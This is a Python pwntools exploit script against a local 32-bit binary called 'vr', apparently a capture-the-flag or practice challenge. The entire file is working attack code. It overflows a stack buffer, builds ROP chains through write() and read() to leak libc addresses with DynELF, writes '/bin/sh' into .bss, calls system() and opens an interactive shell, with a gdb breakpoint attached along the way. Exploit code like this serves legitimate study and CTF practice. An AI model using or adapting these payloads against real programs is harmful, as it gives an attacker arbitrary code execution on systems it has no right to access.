from pwn import *

vul_func = 0x08048436
vr = ELF('vr')
write_plt = vr.symbols['write']
print "write_plt = " + hex(write_plt)
write_got = vr.got['write']
p = process('./vr')

main_addr = 0x804847e
test_addr = 0x8048479
add_esp_8 = 0x0804851b

leak_count = 0

def leak(address):
    shellcode = cyclic(512)
    #shellcode += p32(write_plt) + p32(test_addr) + p32(1) + p32(address) + p32(4)
    shellcode += p32(add_esp_8) + p32(0) + p32(write_plt) + p32(test_addr) + p32(1) + p32(address) + p32(4)
    shellcode += (100 - 7 * 4) * '\x90'
    global leak_count
    leak_count += 1
    print 'leak call {} times'.format(leak_count)
    p.send(shellcode)
    return p.recv(4)

print 'vul func:\t' + hex(vul_func)

#write "/bin/sh" to .bss section
#readelf -S vr
bss_addr = 0x0804a020
read_plt = vr.symbols['read']
print "read plt:\t " + hex(read_plt)

shellcode = cyclic(512)
#ROPgadget --binary vr --only "pop|ret"
pppr_addr = 0x08048519
print "pppr addr:\t " + hex(pppr_addr)
print "bss memory:\t " + hex(bss_addr)

"""================================="""
gdb.attach(p, '''
b *vulnerable_code + 56
display /5i $pc
display /10wx $esp
display /3s 0x0804a020
continue
''')
"""================================="""


#read(STDIN_FILENO, buffer_addr, buffer_size)
shellcode += p32(read_plt) + p32(vul_func) + p32(0) + p32(bss_addr) + p32(7)
shellcode += (100 - 5*4) * '\x90'
p.send(shellcode)
print shellcode

#input_string = '\x90\x90\x90\x90/bin/sh'
input_string = '/bin/sh'
p.send(input_string)

#leak write() address
#system_addr = 0xb7e29b40
dyn = DynELF(leak, elf = vr)
system_addr = dyn.lookup('system', 'libc')
print "system address:\t" + hex(system_addr)
shellcode = 512 * 'A'
exit_func = 0xb7e1d7f0
shellcode += p32(system_addr) + p32(vul_func) + p32(bss_addr)
p.send(shellcode)
print '==========================='
p.interactive()
#p.wait_for_close()
